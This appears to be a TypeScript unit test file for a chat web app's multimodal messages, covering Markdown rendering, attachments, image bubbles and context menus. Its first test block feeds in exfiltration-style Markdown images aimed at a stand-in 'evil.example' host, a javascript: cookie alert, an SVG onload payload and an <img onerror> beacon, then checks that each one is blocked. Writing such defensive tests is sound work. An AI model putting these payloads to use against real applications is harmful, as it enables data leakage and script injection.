/**
 * @module web/tests/multimodal-messages
 * @description 多模态消息体验与安全门禁单测：
 * 1. 安全红线：聊天 Markdown 严禁将 `![alt](url)` 或原始 HTML 渲染为自动发起请求的 `<img>`（防零点击数据外带与 IP 探测）；
 * 2. 摘要前缀：`getMessageSnippet` 对图文/音文/文件/表情混排消息保留媒体标签前缀；
 * 3. 附件编码与输入舱：非表情图片携带清洗后 `fileName`、剪贴板匿名图重命名、动态 Placeholder；
 * 4. 图片气泡形态与公开隔离：紧凑 `p-1` 纯图相框、超长竖图裁切角标（零 `backdrop-blur`）、乐观发送期真实图片容器、公开分享只读隔离条与内联引用微缩略图；
 * 5. 右键菜单 `AppContextMenu`：图片专属动作顺序、`ClipboardItem` 能力门控与纯图转任务预填。
 */
import {
  type AgentId,
  type MessageDto,
  type ProposalCardDto,
  type ProposalId,
  type RoomId,
  type UserId,
  asMessageSeq,
} from "@openhuddle/protocol";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AppTooltipProvider, normalizeContextMenuEntries } from "../components/primitives/index.js";
import { MarkdownContent } from "../components/ui/markdown-content.js";
import { MessageAttachment } from "../components/ui/message-attachment.js";
import { MessageBubble, buildMessageContextMenuItems } from "../components/ui/message-bubble.js";
import { ProposalCardView } from "../components/ui/proposal-card-view.js";
import { resolveComposerPlaceholder } from "../features/huddle-room/components/message-composer.js";
import { getExecutionTierMeta } from "../lib/agent-capability-prefs.js";
import { getMessageSnippet } from "../lib/format.js";
import { withLocale } from "../lib/i18n/index.js";
import {
  encodeMessageAttachment,
  formatDraftAttachmentDisplayName,
  sanitizeAttachmentFileName,
} from "../lib/message-media.js";
import type { OptimisticMessageItem } from "../lib/query-keys.js";

const ROOM_ID = "rom_mm_test_01" as RoomId;
const USER_ID = "usr_mm_owner_01" as UserId;
const AGENT_ID = "agt_mm_codex_01" as AgentId;

afterEach(() => {
  vi.unstubAllGlobals();
});

function makeAgentImageMessage(overrides?: Partial<OptimisticMessageItem>): OptimisticMessageItem {
  return {
    roomId: ROOM_ID,
    seq: asMessageSeq(12),
    type: "text",
    author: {
      kind: "agent",
      agentId: AGENT_ID,
      ownerUserId: USER_ID,
      displayName: "Codex",
      platform: "codex",
      isYou: false,
      isYourOwner: true,
      trustLevel: "owner_sibling_agent",
    },
    content: "",
    attachment: {
      mimeType: "image/png",
      byteLength: 48_200,
      width: 1600,
      height: 900,
      fileName: "architecture.png",
    },
    mentions: [],
    createdAtIso: "2026-11-26T08:00:00.000Z",
    ...overrides,
  };
}

describe("@openhuddle/web — Markdown security redline: zero external <img> auto-load", () => {
  it("never renders <img> for external Markdown image syntax and degrades http(s) to safe explicit links in zh-CN and en", () => {
    const content = [
      "请查看截图 ![泄漏探测](https://evil.example/leak?room=secret&token=123)",
      "无描述图 ![](https://evil.example/pixel.gif)",
      '带标题图 ![系统架构图](https://cdn.example.com/arch.png "v2")',
    ].join("\n\n");

    const zhHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(createElement(MarkdownContent, { content })),
    );

    expect(zhHtml.toLowerCase()).not.toContain("<img");
    expect(zhHtml).toContain('href="https://evil.example/leak?room=secret&amp;token=123"');
    expect(zhHtml).toContain('target="_blank"');
    expect(zhHtml).toContain('rel="noopener noreferrer"');
    expect(zhHtml).toContain("[外部图片：泄漏探测]");
    expect(zhHtml).toContain("[查看外部图片链接]");
    expect(zhHtml).toContain("[外部图片：系统架构图]");

    const enHtml = withLocale("en", () =>
      renderToStaticMarkup(createElement(MarkdownContent, { content })),
    );

    expect(enHtml.toLowerCase()).not.toContain("<img");
    expect(enHtml).toContain('href="https://evil.example/leak?room=secret&amp;token=123"');
    expect(enHtml).toContain("[External image: 泄漏探测]");
    expect(enHtml).toContain("[View external image link]");
    expect(enHtml).toContain("[External image: 系统架构图]");
  });

  it("blocks javascript:, data:, relative paths, and raw HTML <img> from generating any <img> or executable anchor", () => {
    const malicious = [
      "![xss](javascript:alert(document.cookie))",
      "![svg](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)",
      "![csrf](/api/v1/auth/logout)",
      '<img src="https://evil.example/beacon.png" onerror="alert(1)" />',
    ].join("\n");

    const html = renderToStaticMarkup(createElement(MarkdownContent, { content: malicious }));

    expect(html.toLowerCase()).not.toContain("<img");
    expect(html.toLowerCase()).not.toContain("<a ");
    expect(html).not.toContain('href="javascript:');
    expect(html).not.toContain('href="data:');
  });
});

describe("@openhuddle/web — getMessageSnippet multimodal prefix preservation", () => {
  const baseMsg: MessageDto = makeAgentImageMessage({ content: "" });

  it("retains media category prefixes for both pure media and mixed media + text messages in zh-CN and en", () => {
    const stickerMsg: MessageDto = {
      ...baseMsg,
      content: "辛苦啦",
      attachment: { mimeType: "image/webp", byteLength: 2048, stickerName: "点赞" },
    };
    const fileMsg: MessageDto = {
      ...baseMsg,
      content: "请审阅接口契约",
      attachment: {
        mimeType: "application/octet-stream",
        byteLength: 12_800,
        fileName: "openapi.yaml",
      },
    };
    const voiceMsg: MessageDto = {
      ...baseMsg,
      content: "补充两点发布注意事项",
      attachment: { mimeType: "audio/webm", byteLength: 9_600 },
    };

    withLocale("zh-CN", () => {
      expect(getMessageSnippet(baseMsg, 80)).toBe("[图片]");
      expect(
        getMessageSnippet({ ...baseMsg, content: "  请帮我检查   网关层超时配置  " }, 80),
      ).toBe("[图片] 请帮我检查 网关层超时配置");
      expect(getMessageSnippet({ ...stickerMsg, content: "" }, 80)).toBe("[表情] 点赞");
      expect(getMessageSnippet(stickerMsg, 80)).toBe("[表情] 点赞 辛苦啦");
      expect(getMessageSnippet({ ...fileMsg, content: "" }, 80)).toBe("[文件] openapi.yaml");
      expect(getMessageSnippet(fileMsg, 80)).toBe("[文件] openapi.yaml · 请审阅接口契约");
      expect(getMessageSnippet({ ...voiceMsg, content: "" }, 80)).toBe("[语音]");
      expect(getMessageSnippet(voiceMsg, 80)).toBe("[语音] 补充两点发布注意事项");
      expect(getMessageSnippet({ ...fileMsg, recalledAtIso: "2026-11-26T08:01:00.000Z" }, 80)).toBe(
        "该消息已撤回",
      );
    });

    withLocale("en", () => {
      expect(getMessageSnippet(baseMsg, 80)).toBe("[Image]");
      expect(getMessageSnippet({ ...baseMsg, content: "  Check gateway timeout  " }, 80)).toBe(
        "[Image] Check gateway timeout",
      );
      expect(getMessageSnippet({ ...stickerMsg, content: "" }, 80)).toBe("[Sticker] 点赞");
      expect(getMessageSnippet(stickerMsg, 80)).toBe("[Sticker] 点赞 辛苦啦");
      expect(getMessageSnippet({ ...fileMsg, content: "" }, 80)).toBe("[File] openapi.yaml");
      expect(getMessageSnippet(fileMsg, 80)).toBe("[File] openapi.yaml · 请审阅接口契约");
      expect(getMessageSnippet({ ...voiceMsg, content: "" }, 80)).toBe("[Voice]");
      expect(getMessageSnippet(voiceMsg, 80)).toBe("[Voice] 补充两点发布注意事项");
      expect(getMessageSnippet({ ...fileMsg, recalledAtIso: "2026-11-26T08:01:00.000Z" }, 80)).toBe(
        "Message recalled",
      );
    });
  });
});

describe("@openhuddle/web — attachment filename sanitization, upload encoding & composer placeholders", () => {
  it("sanitizes filenames safely and formats anonymous clipboard image names in zh-CN and en", () => {
    expect(sanitizeAttachmentFileName("reply.png")).toBe("reply.png");
    expect(sanitizeAttachmentFileName("C:\\fakepath\\diagram\u0000.png")).toBe("diagram.png");
    expect(sanitizeAttachmentFileName("..")).toBeUndefined();
    expect(sanitizeAttachmentFileName("   ")).toBeUndefined();

    withLocale("zh-CN", () => {
      expect(formatDraftAttachmentDisplayName({ name: "image.png", mimeType: "image/png" })).toBe(
        "剪贴板图片.png",
      );
      expect(formatDraftAttachmentDisplayName({ name: "   ", mimeType: "image/png" })).toBe("附件");
      expect(formatDraftAttachmentDisplayName({ name: "flow-v2.png", mimeType: "image/png" })).toBe(
        "flow-v2.png",
      );
      expect(
        formatDraftAttachmentDisplayName({
          name: "image.png",
          mimeType: "image/png",
          stickerName: "开心",
        }),
      ).toBe("image.png");
    });

    withLocale("en", () => {
      expect(formatDraftAttachmentDisplayName({ name: "image.png", mimeType: "image/png" })).toBe(
        "Clipboard image.png",
      );
      expect(formatDraftAttachmentDisplayName({ name: "   ", mimeType: "image/png" })).toBe(
        "Attachment",
      );
      expect(formatDraftAttachmentDisplayName({ name: "flow-v2.png", mimeType: "image/png" })).toBe(
        "flow-v2.png",
      );
    });
  });

  it("includes fileName when encoding non-sticker images and omits fileName for stickers", async () => {
    class StubFileReader {
      result: string | null = null;
      onload: (() => void) | null = null;
      onerror: (() => void) | null = null;
      onabort: (() => void) | null = null;
      readAsDataURL(_blob: Blob): void {
        this.result = "data:image/png;base64,iVBORw0KGgo=";
        this.onload?.();
      }
    }
    vi.stubGlobal("FileReader", StubFileReader);

    const blob = new Blob([new Uint8Array([1, 2, 3])], { type: "image/png" });
    const uploadedImage = await encodeMessageAttachment({
      blob,
      mimeType: "image/png",
      name: "reply.png",
    });
    expect(uploadedImage).toEqual({
      mimeType: "image/png",
      fileName: "reply.png",
      data: "iVBORw0KGgo=",
    });

    const uploadedSticker = await encodeMessageAttachment({
      blob,
      mimeType: "image/png",
      name: "thumbs-up",
      stickerName: "点赞",
    });
    expect(uploadedSticker).toEqual({
      mimeType: "image/png",
      stickerName: "点赞",
      data: "iVBORw0KGgo=",
    });
  });

  it("computes context-aware composer placeholders for normal, image-draft, dispatch, and ask modes", () => {
    withLocale("zh-CN", () => {
      expect(
        resolveComposerPlaceholder({
          roomName: "Codex",
          roomKind: "direct_agent",
          dispatchMode: false,
          askMode: false,
          hasDraftImage: false,
        }),
      ).toBe("发消息或图片给 Codex…");

      expect(
        resolveComposerPlaceholder({
          roomName: "架构评审群",
          roomKind: "group",
          dispatchMode: false,
          askMode: false,
          hasDraftImage: true,
        }),
      ).toBe("输入 @ 让 Agent 看图分析，或直接发送…");

      expect(
        resolveComposerPlaceholder({
          roomName: "架构评审群",
          roomKind: "group",
          dispatchMode: true,
          askMode: false,
          hasDraftImage: true,
        }),
      ).toBe("结合这张图片写下要交办的任务说明…");

      expect(
        resolveComposerPlaceholder({
          roomName: "架构评审群",
          roomKind: "group",
          dispatchMode: false,
          askMode: true,
          hasDraftImage: true,
        }),
      ).toBe("结合这张图片写下要提问的问题…");
    });
  });
});

describe("@openhuddle/web — MessageBubble & MessageAttachment layout, optimistic & readOnly states", () => {
  const nowMs = Date.parse("2026-11-26T08:00:30.000Z");

  it("renders standalone image with compact p-1 frame, aspect-ratio 0-CLS sizing, and zero fixed gray box", () => {
    const html = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: makeAgentImageMessage(),
          nowMs,
        }),
      ),
    );

    expect(html).toContain("p-1");
    expect(html).toContain("rounded-[14px]");
    expect(html).toContain("aspect-ratio:1600 / 900");
    expect(html).not.toContain("h-40 w-60");
    expect(html).not.toContain("backdrop-blur");
  });

  it("renders tall flowcharts (H / W > 2.2) with top crop and non-blurred tall badge in zh-CN and en", () => {
    const tallMsg = makeAgentImageMessage({
      attachment: {
        mimeType: "image/png",
        byteLength: 92_000,
        width: 800,
        height: 2200,
        fileName: "long-sequence.png",
      },
    });
    const zhHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: tallMsg,
            nowMs,
          }),
        ),
      ),
    );

    expect(zhHtml).toContain("object-cover object-top");
    expect(zhHtml).toContain("长图 · 查看全图");
    expect(zhHtml).toContain("bg-[#181B22]/76");
    expect(zhHtml).not.toContain("backdrop-blur");

    const enHtml = withLocale("en", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: tallMsg,
            nowMs,
          }),
        ),
      ),
    );
    expect(enHtml).toContain("Tall image · View full");
    expect(enHtml).not.toContain("backdrop-blur");
  });

  it("renders optimistic pending image bubble with proportional frame and localized progress capsule", () => {
    const optimisticImg = makeAgentImageMessage({
      author: {
        kind: "human",
        userId: USER_ID,
        ownerUserId: USER_ID,
        displayName: "庞彦",
        isYou: true,
        isYourOwner: true,
        trustLevel: "owner_command",
      },
      _optimisticPending: true,
      _optimisticBlob: new Blob([new Uint8Array([1, 2, 3])], { type: "image/png" }),
    });

    const zhHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: optimisticImg,
            nowMs,
          }),
        ),
      ),
    );

    expect(zhHtml).toContain('aria-label="图片发送中"');
    expect(zhHtml).toContain("bg-[#181B22]/68");
    expect(zhHtml).not.toContain("opacity-80");
    expect(zhHtml).not.toContain(">图片</span>");

    const enHtml = withLocale("en", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: optimisticImg,
            nowMs,
          }),
        ),
      ),
    );

    expect(enHtml).toContain('aria-label="Sending image"');
    expect(enHtml).toContain("Sending");
  });

  it("isolates attachments on public readOnly share pages and embeds 28x28 reply micro-thumbnails only in member view (zh-CN & en)", () => {
    const quotedImg = makeAgentImageMessage({ seq: asMessageSeq(9), content: "线上监控火焰图" });
    const pureWithUndefinedAttachment = makeAgentImageMessage({
      seq: asMessageSeq(15),
      content: "瓶颈在连接池竞争",
      replyToSeq: asMessageSeq(9),
    });
    const { attachment: _dropAttachment, ...replyMsg } = pureWithUndefinedAttachment;

    const memberReplyZhHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: replyMsg,
            repliedMessage: quotedImg,
            nowMs,
            readOnly: false,
          }),
        ),
      ),
    );
    expect(memberReplyZhHtml).toContain("h-7 w-7 shrink-0 rounded-[6px] object-cover");
    expect(memberReplyZhHtml).toContain("[图片] 线上监控火焰图");

    const memberReplyEnHtml = withLocale("en", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: replyMsg,
            repliedMessage: quotedImg,
            nowMs,
            readOnly: false,
          }),
        ),
      ),
    );
    expect(memberReplyEnHtml).toContain("h-7 w-7 shrink-0 rounded-[6px] object-cover");
    expect(memberReplyEnHtml).toContain("[Image] 线上监控火焰图");

    const publicShareImgZhHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: makeAgentImageMessage({ seq: asMessageSeq(9), content: "" }),
            nowMs,
            readOnly: true,
          }),
        ),
      ),
    );
    expect(publicShareImgZhHtml).toContain("图片附件（仅群成员可见）");
    expect(publicShareImgZhHtml).toContain("px-3 py-2");
    expect(publicShareImgZhHtml).not.toContain("/attachment");

    const publicShareImgEnHtml = withLocale("en", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: makeAgentImageMessage({ seq: asMessageSeq(9), content: "" }),
            nowMs,
            readOnly: true,
          }),
        ),
      ),
    );
    expect(publicShareImgEnHtml).toContain("Image attachment (members only)");
    expect(publicShareImgEnHtml).not.toContain("/attachment");

    const strippedEmptyMsg = makeAgentImageMessage({ seq: asMessageSeq(10), content: "" });
    const { attachment: _omitAtt, ...emptyReadOnlyMsg } = strippedEmptyMsg;
    const emptyReadOnlyZhHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: emptyReadOnlyMsg,
            nowMs,
            readOnly: true,
          }),
        ),
      ),
    );
    expect(emptyReadOnlyZhHtml).toContain("消息内容仅群成员可见");

    const emptyReadOnlyEnHtml = withLocale("en", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(MessageBubble, {
            message: emptyReadOnlyMsg,
            nowMs,
            readOnly: true,
          }),
        ),
      ),
    );
    expect(emptyReadOnlyEnHtml).toContain("Message content is visible to room members only");

    const publicShareReplyHtml = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: replyMsg,
          repliedMessage: quotedImg,
          nowMs,
          readOnly: true,
        }),
      ),
    );
    expect(publicShareReplyHtml).not.toContain("h-7 w-7 shrink-0 rounded-[6px]");
  });

  it("orders image message AppContextMenu items accurately and prefills task seed in zh-CN and en", () => {
    const onConvertToWorkTaskZh = vi.fn();
    const mixedImageMsg = makeAgentImageMessage({
      seq: asMessageSeq(12),
      content: "这是压测对比图",
    });

    const zhEntriesWithClip = withLocale("zh-CN", () =>
      normalizeContextMenuEntries(
        buildMessageContextMenuItems({
          message: mixedImageMsg,
          isPending: false,
          isSelf: false,
          canRecall: false,
          canSaveSticker: false,
          canCopyImage: true,
          isAgentInspectable: true,
          hasLinkedProposal: false,
          capturedSelection: "",
          onReply: vi.fn(),
          onOpenLightbox: vi.fn(),
          onCopyImage: vi.fn(),
          onDownloadImage: vi.fn(),
          onCopyMessageContent: vi.fn(),
          onConvertToWorkTask: onConvertToWorkTaskZh,
          onQuickMention: vi.fn(),
          onInspectAgent: vi.fn(),
        }),
      ),
    );

    const zhLabels = zhEntriesWithClip
      .filter((item) => item.kind !== "separator" && item.kind !== "label")
      .map((item) => item.label);
    expect(zhLabels.slice(0, 6)).toEqual([
      "回复此消息",
      "查看大图",
      "复制图片",
      "下载图片",
      "复制消息文字",
      "转为任务…",
    ]);

    const zhPureImageEntries = withLocale("zh-CN", () =>
      normalizeContextMenuEntries(
        buildMessageContextMenuItems({
          message: makeAgentImageMessage({ seq: asMessageSeq(12), content: "" }),
          isPending: false,
          isSelf: false,
          canRecall: false,
          canSaveSticker: false,
          canCopyImage: false,
          isAgentInspectable: false,
          hasLinkedProposal: false,
          capturedSelection: "",
          onReply: vi.fn(),
          onOpenLightbox: vi.fn(),
          onCopyImage: vi.fn(),
          onDownloadImage: vi.fn(),
          onConvertToWorkTask: onConvertToWorkTaskZh,
        }),
      ),
    );
    const zhPureLabels = zhPureImageEntries
      .filter((item) => item.kind !== "separator" && item.kind !== "label")
      .map((item) => item.label);
    expect(zhPureLabels).toEqual(["回复此消息", "查看大图", "下载图片", "转为任务…"]);

    const zhToTaskItem = zhPureImageEntries.find((item) => item.id === "ctx-msg-to-task");
    if (
      zhToTaskItem &&
      zhToTaskItem.kind !== "separator" &&
      zhToTaskItem.kind !== "label" &&
      zhToTaskItem.kind !== "submenu"
    ) {
      zhToTaskItem.onSelect();
    }
    expect(onConvertToWorkTaskZh).toHaveBeenCalledWith("请结合消息 #12 的图片处理：");

    const onConvertToWorkTaskEn = vi.fn();
    const enEntriesWithClip = withLocale("en", () =>
      normalizeContextMenuEntries(
        buildMessageContextMenuItems({
          message: mixedImageMsg,
          isPending: false,
          isSelf: false,
          canRecall: false,
          canSaveSticker: false,
          canCopyImage: true,
          isAgentInspectable: true,
          hasLinkedProposal: false,
          capturedSelection: "",
          onReply: vi.fn(),
          onOpenLightbox: vi.fn(),
          onCopyImage: vi.fn(),
          onDownloadImage: vi.fn(),
          onCopyMessageContent: vi.fn(),
          onConvertToWorkTask: onConvertToWorkTaskEn,
          onQuickMention: vi.fn(),
          onInspectAgent: vi.fn(),
        }),
      ),
    );
    const enLabels = enEntriesWithClip
      .filter((item) => item.kind !== "separator" && item.kind !== "label")
      .map((item) => item.label);
    expect(enLabels.slice(0, 6)).toEqual([
      "Reply",
      "View image",
      "Copy image",
      "Download image",
      "Copy message text",
      "Turn into task...",
    ]);

    const enPureImageEntries = withLocale("en", () =>
      normalizeContextMenuEntries(
        buildMessageContextMenuItems({
          message: makeAgentImageMessage({ seq: asMessageSeq(12), content: "" }),
          isPending: false,
          isSelf: false,
          canRecall: false,
          canSaveSticker: false,
          canCopyImage: false,
          isAgentInspectable: false,
          hasLinkedProposal: false,
          capturedSelection: "",
          onReply: vi.fn(),
          onOpenLightbox: vi.fn(),
          onCopyImage: vi.fn(),
          onDownloadImage: vi.fn(),
          onConvertToWorkTask: onConvertToWorkTaskEn,
        }),
      ),
    );
    const enToTaskItem = enPureImageEntries.find((item) => item.id === "ctx-msg-to-task");
    if (
      enToTaskItem &&
      enToTaskItem.kind !== "separator" &&
      enToTaskItem.kind !== "label" &&
      enToTaskItem.kind !== "submenu"
    ) {
      enToTaskItem.onSelect();
    }
    expect(onConvertToWorkTaskEn).toHaveBeenCalledWith(
      "Handle based on the image in message #12: ",
    );
  });

  it("renders readOnly recessed isolation bars for file and voice attachments without exposing /attachment URLs (zh-CN & en)", () => {
    const fileProps = {
      message: {
        roomId: ROOM_ID,
        seq: asMessageSeq(20),
        attachment: {
          mimeType: "application/octet-stream" as const,
          byteLength: 4096,
          fileName: "report.pdf",
        },
      },
      isPending: false,
      readOnly: true,
    };
    const voiceProps = {
      message: {
        roomId: ROOM_ID,
        seq: asMessageSeq(21),
        attachment: {
          mimeType: "audio/webm" as const,
          byteLength: 8192,
        },
      },
      isPending: false,
      readOnly: true,
    };

    const zhFileHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(createElement(MessageAttachment, fileProps)),
    );
    expect(zhFileHtml).toContain("文件附件（仅群成员可见）");
    expect(zhFileHtml).not.toContain("/attachment");

    const enFileHtml = withLocale("en", () =>
      renderToStaticMarkup(createElement(MessageAttachment, fileProps)),
    );
    expect(enFileHtml).toContain("File attachment (members only)");
    expect(enFileHtml).not.toContain("/attachment");

    const zhVoiceHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(createElement(MessageAttachment, voiceProps)),
    );
    expect(zhVoiceHtml).toContain("语音消息（仅群成员可见）");
    expect(zhVoiceHtml).not.toContain("/attachment");

    const enVoiceHtml = withLocale("en", () =>
      renderToStaticMarkup(createElement(MessageAttachment, voiceProps)),
    );
    expect(enVoiceHtml).toContain("Voice message (members only)");
    expect(enVoiceHtml).not.toContain("/attachment");
  });

  it("renders bilingual execution tier metadata and ProposalCardView stances cleanly in zh-CN and en", () => {
    expect(getExecutionTierMeta("chat_only", "zh-CN").shortLabel).toBe("仅讨论");
    expect(getExecutionTierMeta("chat_only", "en").shortLabel).toBe("Chat only");
    expect(getExecutionTierMeta("workspace_read", "en").shortLabel).toBe("Read code");
    expect(getExecutionTierMeta("worktree_write", "en").shortLabel).toBe("Edit code");

    const proposal: ProposalCardDto = {
      id: "prp_mm_01" as ProposalId,
      roomId: ROOM_ID,
      originMessageSeq: asMessageSeq(10),
      status: "approved",
      decidedOptionKey: "A",
      draft: {
        title: "Adopt bilingual i18n architecture",
        contextSummary: "Keep zero external runtime i18n dependencies.",
        recommendedOptionKey: "A",
        options: [
          {
            optionKey: "A",
            label: "Compile-time catalog",
            summary: "Zero-dependency typed defineCatalog",
            pros: ["Type-safe placeholders"],
            cons: [],
            risks: [],
          },
        ],
      },
      votes: [
        {
          voter: {
            kind: "agent",
            agentId: AGENT_ID,
            ownerUserId: USER_ID,
            displayName: "Codex",
            platform: "codex",
            isYou: false,
            isYourOwner: true,
            trustLevel: "owner_sibling_agent",
          },
          stance: "endorse",
          preferredOptionKey: "A",
          rationale: "Clean and zero-overhead.",
          createdAtIso: "2026-11-26T08:00:00.000Z",
        },
      ],
      createdAtIso: "2026-11-26T08:00:00.000Z",
    };

    const zhProposalHtml = withLocale("zh-CN", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(ProposalCardView, { proposal, interactive: false }),
        ),
      ),
    );
    expect(zhProposalHtml).toContain("共识提案");
    expect(zhProposalHtml).toContain("已拍板");
    expect(zhProposalHtml).toContain("赞成");

    const enProposalHtml = withLocale("en", () =>
      renderToStaticMarkup(
        createElement(
          AppTooltipProvider,
          null,
          createElement(ProposalCardView, { proposal, interactive: false }),
        ),
      ),
    );
    expect(enProposalHtml).toContain("Proposal");
    expect(enProposalHtml).toContain("Approved");
    expect(enProposalHtml).toContain("Endorse");
    expect(enProposalHtml).toContain("Adopted");
  });
});
